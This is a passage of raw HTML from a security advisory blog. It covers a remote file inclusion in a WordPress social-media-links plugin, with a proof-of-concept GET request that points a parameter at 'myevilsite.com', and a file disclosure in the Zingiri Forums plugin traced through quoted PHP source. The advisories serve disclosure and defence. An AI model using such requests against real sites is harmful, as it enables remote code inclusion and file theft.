			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
GET /wordpress/wp-content/plugins/floating-social-media-links/fsml-hideshow.js.php?wpp=http://myevilsite.com HTTP/1.1
Host: 192.168.80.130</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-53c98e78b6a75950925093-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e78b6a75950925093-2">2</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-line" id="crayon-53c98e78b6a75950925093-1"><span class="crayon-i">GET</span><span class="crayon-h"> </span><span class="crayon-o">/</span><span class="crayon-i">wordpress</span><span class="crayon-o">/</span><span class="crayon-i">wp</span><span class="crayon-o">-</span><span class="crayon-i">content</span><span class="crayon-o">/</span><span class="crayon-i">plugins</span><span class="crayon-o">/</span><span class="crayon-i">floating</span><span class="crayon-o">-</span><span class="crayon-i">social</span><span class="crayon-o">-</span><span class="crayon-i">media</span><span class="crayon-o">-</span><span class="crayon-i">links</span><span class="crayon-o">/</span><span class="crayon-i">fsml</span><span class="crayon-o">-</span><span class="crayon-v">hideshow</span><span class="crayon-sy">.</span><span class="crayon-v">js</span><span class="crayon-sy">.</span><span class="crayon-i">php</span><span class="crayon-sy">?</span><span class="crayon-v">wpp</span><span class="crayon-o">=</span><span class="crayon-i">http</span><span class="crayon-o">:</span><span class="crayon-c">//myevilsite.com HTTP/1.1</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e78b6a75950925093-2"><span class="crayon-i">Host</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-cn">192.168.80.130</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0016 seconds] -->
<br />
&nbsp;</p>
</div>
					</div><!-- .entry-content -->
	
	<footer class="entry-meta">
										<span class="cat-links">
				Posted in <a href="https://charlieeriksen.github.io/category/advisories/" title="View all posts in Advisories" rel="category tag">Advisories</a>			</span>
			<span class="sep"> / </span>			
						
						<span class="tag-links">
				Tagged <a href="https://charlieeriksen.github.io/tag/rfi/" rel="tag">RFI</a>, <a href="https://charlieeriksen.github.io/tag/wordpress-plugin/" rel="tag">Wordpress plugin</a>			</span>
			<span class="sep"> / </span>
							
				<span class="comments-link"><a href="https://charlieeriksen.github.io/2013/01/12/wordpress-floating-social-media-link-plugins-remote-file-inclusion/#respond" title="Comment on WordPress Floating Social Media Link Plugins Remote File Inclusion">Leave a comment</a></span>
		<span class="sep"> / </span>
				
					</footer><!-- #entry-meta -->
</article><!-- #post-213 -->

				
					
<article id="post-164" class="post-164 post type-post status-publish format-standard hentry category-advisories tag-file-disclosure tag-wordpress-plugin tag-zingiri-forums">
	<header class="entry-header">
				<div class="entry-meta">
			<a href="https://charlieeriksen.github.io/2013/01/12/wordpress-zingiri-forums-arbitrary-file-disclosure/" title="3:43 am" rel="bookmark" class="entry-date"><time datetime="2013-01-12T03:43:07+00:00" pubdate>January 12, 2013</time></a> by Charlie Eriksen		</div><!-- .entry-meta -->
		<h2 class="entry-title"><a href="https://charlieeriksen.github.io/2013/01/12/wordpress-zingiri-forums-arbitrary-file-disclosure/" title="Permalink to WordPress Zingiri Forums arbitrary file disclosure" rel="bookmark">WordPress Zingiri Forums arbitrary file disclosure</a></h2>

				
					</header><!-- .entry-header -->
	

		<div class="entry-content">
				<p><strong>Advisory</strong></p>
<p><a href="http://secunia.com/advisories/50833/">Secunia Advisory SA50833</p>
<p></a></p>
<p><strong>Analysis of vulnerability</strong></p>
<p>The Zingiri Web Forums for WordPress writes our a header for the forum in <a href="http://plugins.svn.wordpress.org/zingiri-forum/tags/1.4.2/forum.php">forum.php</a> through adding an action to wp_head.</p><!-- Crayon Syntax Highlighter v2.5.0 -->

		<div id="crayon-53c98e78b71c6601179701" class="crayon-syntax crayon-theme-twilight crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; float: none; clear: both; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
add_action('wp_head','zing_forum_header');</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-53c98e78b71c6601179701-44">44</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-line" id="crayon-53c98e78b71c6601179701-44"><span class="crayon-e">add_action</span><span class="crayon-sy">(</span><span class="crayon-s">'wp_head'</span><span class="crayon-sy">,</span><span class="crayon-s">'zing_forum_header'</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0007 seconds] -->
<p></p><!-- Crayon Syntax Highlighter v2.5.0 -->

		<div id="crayon-53c98e78b71d4310258291" class="crayon-syntax crayon-theme-twilight crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; float: none; clear: both; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-mixed-highlight" title="Contains Mixed Languages"></span><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
function zing_forum_header()
{
	global $zing_forum_content;
	global $zing_forum_menu;
	$output=zing_forum_output("content");

	zing_integrator_cut($output,'&lt;div id="footer"&gt;','&lt;/div&gt;'); //remove footer
	zing_integrator_cut($output,'&lt;span class="forgot_password"&gt;','&lt;/span&gt;');

	$zing_forum_content=$output;

	echo '&lt;script type="text/javascript" language="javascript"&gt;';
	echo "var zing_forum_url='".ZING_FORUM_URL."ajax/';";
	echo "var zing_forum_index='".get_option('home')."/index.php?';";
	echo "function zing_forum_url_ajax(s) { return zing_forum_url+s; }";
	echo '&lt;/script&gt;';

	echo '&lt;link rel="stylesheet" type="text/css" href="' . ZING_FORUM_URL . 'zing.css" media="screen" /&gt;';
}</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-53c98e78b71d4310258291-686">686</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e78b71d4310258291-687">687</div><div class="crayon-num" data-line="crayon-53c98e78b71d4310258291-688">688</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e78b71d4310258291-689">689</div><div class="crayon-num" data-line="crayon-53c98e78b71d4310258291-690">690</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e78b71d4310258291-691">691</div><div class="crayon-num" data-line="crayon-53c98e78b71d4310258291-692">692</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e78b71d4310258291-693">693</div><div class="crayon-num" data-line="crayon-53c98e78b71d4310258291-694">694</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e78b71d4310258291-695">695</div><div class="crayon-num" data-line="crayon-53c98e78b71d4310258291-696">696</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e78b71d4310258291-697">697</div><div class="crayon-num" data-line="crayon-53c98e78b71d4310258291-698">698</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e78b71d4310258291-699">699</div><div class="crayon-num" data-line="crayon-53c98e78b71d4310258291-700">700</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e78b71d4310258291-701">701</div><div class="crayon-num" data-line="crayon-53c98e78b71d4310258291-702">702</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e78b71d4310258291-703">703</div><div class="crayon-num" data-line="crayon-53c98e78b71d4310258291-704">704</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-line" id="crayon-53c98e78b71d4310258291-686"><span class="crayon-t">function</span><span class="crayon-h"> </span><span class="crayon-e">zing_forum_header</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e78b71d4310258291-687"><span class="crayon-sy">{</span></div><div class="crayon-line" id="crayon-53c98e78b71d4310258291-688"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-m">global</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-i">zing_forum_content</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e78b71d4310258291-689"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-m">global</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-i">zing_forum_menu</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c98e78b71d4310258291-690"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-v">output</span><span class="crayon-o">=</span><span class="crayon-e">zing_forum_output</span><span class="crayon-sy">(</span><span class="crayon-s">"content"</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e78b71d4310258291-691">&nbsp;</div><div class="crayon-line" id="crayon-53c98e78b71d4310258291-692"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-e">zing_integrator_cut</span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-i">output</span><span class="crayon-sy">,</span><span class="crayon-s">'&lt;div id="footer"&gt;'</span><span class="crayon-sy">,</span><span class="crayon-s">'&lt;/div&gt;'</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span><span class="crayon-h"> </span><span class="crayon-c">//remove footer</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e78b71d4310258291-693"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-e">zing_integrator_cut</span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-i">output</span><span class="crayon-sy">,</span><span class="crayon-s">'&lt;span class="forgot_password"&gt;'</span><span class="crayon-sy">,</span><span class="crayon-s">'&lt;/span&gt;'</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c98e78b71d4310258291-694">&nbsp;</div><div class="crayon-line crayon-striped-line" id="crayon-53c98e78b71d4310258291-695"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-v">zing_forum_content</span><span class="crayon-o">=</span><span class="crayon-sy">$</span><span class="crayon-i">output</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c98e78b71d4310258291-696">&nbsp;</div><div class="crayon-line crayon-striped-line" id="crayon-53c98e78b71d4310258291-697"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-i">echo</span><span class="crayon-h"> </span><span class="crayon-s">'<span class="crayon-ta">&lt;script </span><span class="crayon-e ">type</span><span class="crayon-o">=</span><span class="crayon-s">"text/javascript"</span><span class="crayon-h"> </span><span class="crayon-e ">language</span><span class="crayon-o">=</span><span class="crayon-s">"javascript"</span><span class="crayon-o">&gt;</span><span class="crayon-s">';</span></div><div class="crayon-line" id="crayon-53c98e78b71d4310258291-698"><span class="crayon-s">&nbsp;&nbsp;&nbsp;&nbsp;echo "var zing_forum_url='</span><span class="crayon-s">".ZING_FORUM_URL."</span><span class="crayon-i">ajax</span><span class="crayon-c ">/';";</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e78b71d4310258291-699"><span class="crayon-c ">&nbsp;&nbsp;&nbsp;&nbsp;echo "var zing_forum_index='".get_option('home')."/i</span><span class="crayon-v">ndex</span><span class="crayon-sy">.</span><span class="crayon-i">php</span><span class="crayon-sy">?</span><span class="crayon-s">';";</span></div><div class="crayon-line" id="crayon-53c98e78b71d4310258291-700"><span class="crayon-s">&nbsp;&nbsp;&nbsp;&nbsp;echo "function zing_forum_url_ajax(s) { return zing_forum_url+s; }";</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e78b71d4310258291-701"><span class="crayon-s">&nbsp;&nbsp;&nbsp;&nbsp;echo '</span><span class="crayon-ta">&lt;/script&gt;</span>'</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c98e78b71d4310258291-702">&nbsp;</div><div class="crayon-line crayon-striped-line" id="crayon-53c98e78b71d4310258291-703"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-i">echo</span><span class="crayon-h"> </span><span class="crayon-s">'&lt;link rel="stylesheet" type="text/css" href="'</span><span class="crayon-h"> </span><span class="crayon-sy">.</span><span class="crayon-h"> </span><span class="crayon-v">ZING_FORUM_URL</span><span class="crayon-h"> </span><span class="crayon-sy">.</span><span class="crayon-h"> </span><span class="crayon-s">'zing.css" media="screen" /&gt;'</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c98e78b71d4310258291-704"><span class="crayon-sy">}</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0070 seconds] -->
<p>So on each load of the WordPress blog it will call into zing_forum_header. The first call it makes it into zing_forum_output, which is rather long. I&#8217;ve highlighted two areas:</p><!-- Crayon Syntax Highlighter v2.5.0 -->

		<div id="crayon-53c98e78b71de294939227" class="crayon-syntax crayon-theme-twilight crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; float: none; clear: both; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
function zing_forum_output($process) {
	global $post,$wpdb,$zing_forum_loaded,$zing_forum_to_include,$zing_forum_mode;

	$postVar=array();
	switch ($process)
	{
		case "content":
			if (isset($post)) $cf=get_post_custom($post-&gt;ID);
			if (isset($_GET['zforum']))
			{
				$zing_forum_to_include=$_GET['zforum'];
				$zing_forum_mode="forum";
			}</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-53c98e78b71de294939227-456">456</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e78b71de294939227-457">457</div><div class="crayon-num" data-line="crayon-53c98e78b71de294939227-458">458</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e78b71de294939227-459">459</div><div class="crayon-num" data-line="crayon-53c98e78b71de294939227-460">460</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e78b71de294939227-461">461</div><div class="crayon-num" data-line="crayon-53c98e78b71de294939227-462">462</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e78b71de294939227-463">463</div><div class="crayon-num" data-line="crayon-53c98e78b71de294939227-464">464</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e78b71de294939227-465">465</div><div class="crayon-num" data-line="crayon-53c98e78b71de294939227-466">466</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e78b71de294939227-467">467</div><div class="crayon-num" data-line="crayon-53c98e78b71de294939227-468">468</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-line" id="crayon-53c98e78b71de294939227-456"><span class="crayon-t">function</span><span class="crayon-h"> </span><span class="crayon-e">zing_forum_output</span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-i">process</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e78b71de294939227-457"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-m">global</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-i">post</span><span class="crayon-sy">,</span><span class="crayon-sy">$</span><span class="crayon-i">wpdb</span><span class="crayon-sy">,</span><span class="crayon-sy">$</span><span class="crayon-i">zing_forum_loaded</span><span class="crayon-sy">,</span><span class="crayon-sy">$</span><span class="crayon-i">zing_forum_to_include</span><span class="crayon-sy">,</span><span class="crayon-sy">$</span><span class="crayon-i">zing_forum_mode</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c98e78b71de294939227-458">&nbsp;</div><div class="crayon-line crayon-striped-line" id="crayon-53c98e78b71de294939227-459"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-v">postVar</span><span class="crayon-o">=</span><span class="crayon-t">array</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c98e78b71de294939227-460"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">switch</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-i">process</span><span class="crayon-sy">)</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e78b71de294939227-461"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">{</span></div><div class="crayon-line" id="crayon-53c98e78b71de294939227-462"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">case</span><span class="crayon-h"> </span><span class="crayon-s">"content"</span><span class="crayon-o">:</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e78b71de294939227-463"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">if</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-e">isset</span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-i">post</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-v">cf</span><span class="crayon-o">=</span><span class="crayon-e">get_post_custom</span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-i">post</span><span class="crayon-o">-&gt;</span><span class="crayon-i">ID</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c98e78b71de294939227-464"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">if</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-e">isset</span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-v">_GET</span><span class="crayon-sy">[</span><span class="crayon-s">'zforum'</span><span class="crayon-sy">]</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e78b71de294939227-465"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">{</span></div><div class="crayon-line" id="crayon-53c98e78b71de294939227-466"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-v">zing_forum_to_include</span><span class="crayon-o">=</span><span class="crayon-sy">$</span><span class="crayon-v">_GET</span><span class="crayon-sy">[</span><span class="crayon-s">'zforum'</span><span class="crayon-sy">]</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e78b71de294939227-467"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-v">zing_forum_mode</span><span class="crayon-o">=</span><span class="crayon-s">"forum"</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c98e78b71de294939227-468"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">}</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0039 seconds] -->
<p>We can affect the value of $zing_forum_to_include through the zforum GET variable. This is then used in a big else if statement. Here is the block of code that is executed if we set that to css:</p><!-- Crayon Syntax Highlighter v2.5.0 -->

		<div id="crayon-53c98e78b71e7788138840" class="crayon-syntax crayon-theme-twilight crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; float: none; clear: both; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
} elseif ($zing_forum_to_include=='css') {
		ob_end_clean();
		if (isset($_GET['stylesheet'])) $key=$_GET['stylesheet'];
		else $key=$_GET['url'];
		if (isset($_SESSION['ccforum']['stylesheet'][$key])) {
			$output=$_SESSION['ccforum']['stylesheet'][$key];
		} else {
			if (isset($_GET['stylesheet'])) {
				$http=zing_forum_http("mybb",'css.php',"");
				$news = new zHttpRequest($http,'zingiri-forum');
				if (!$news-&gt;curlInstalled()) return "cURL not installed";
				elseif (!$news-&gt;live()) return "A HTTP Error occured";
				$output=$news-&gt;DownloadToString();
				$output=str_replace('url(images/','url('.ZING_MYBB_URL.'/images/',$output);

			} elseif ($_GET['url']) {
				$url=$_GET['url'];
				$output=file_get_contents(ZING_MYBB_DIR.'/cache/themes/'.$url);
			}
			$f[]='/^body.*{(.*?)/';
			$r[]=' {$1';
			$f[]='/.zingbody/';
			$r[]='';
			$f[]='/(.*?).{(.*?)/';
			$r[]='.ccforum $1 {$2';
			$f[]='/(.*?),(.*?).{(.*?)/';
			$r[]='$1,.ccforum $2 {$3';
			$f[]='/(.*?),(.*?),(.*?).{(.*?)/';
			$r[]='$1,$2,.ccforum $3 {$4';
			$output=preg_replace($f,$r,$output,-1,$count);
			if ($output) $_SESSION['ccforum']['stylesheet'][$key]=$output;
		}
		header("Content-type: text/css");
		echo $output;
		die();</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-53c98e78b71e7788138840-541">541</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e78b71e7788138840-542">542</div><div class="crayon-num" data-line="crayon-53c98e78b71e7788138840-543">543</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e78b71e7788138840-544">544</div><div class="crayon-num" data-line="crayon-53c98e78b71e7788138840-545">545</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e78b71e7788138840-546">546</div><div class="crayon-num" data-line="crayon-53c98e78b71e7788138840-547">547</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e78b71e7788138840-548">548</div><div class="crayon-num" data-line="crayon-53c98e78b71e7788138840-549">549</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e78b71e7788138840-550">550</div><div class="crayon-num" data-line="crayon-53c98e78b71e7788138840-551">551</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e78b71e7788138840-552">552</div><div class="crayon-num" data-line="crayon-53c98e78b71e7788138840-553">553</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e78b71e7788138840-554">554</div><div class="crayon-num" data-line="crayon-53c98e78b71e7788138840-555">555</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e78b71e7788138840-556">556</div><div class="crayon-num" data-line="crayon-53c98e78b71e7788138840-557">557</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e78b71e7788138840-558">558</div><div class="crayon-num" data-line="crayon-53c98e78b71e7788138840-559">559</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e78b71e7788138840-560">560</div><div class="crayon-num" data-line="crayon-53c98e78b71e7788138840-561">561</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e78b71e7788138840-562">562</div><div class="crayon-num" data-line="crayon-53c98e78b71e7788138840-563">563</div><div class="crayon-num crayon-striped-num" 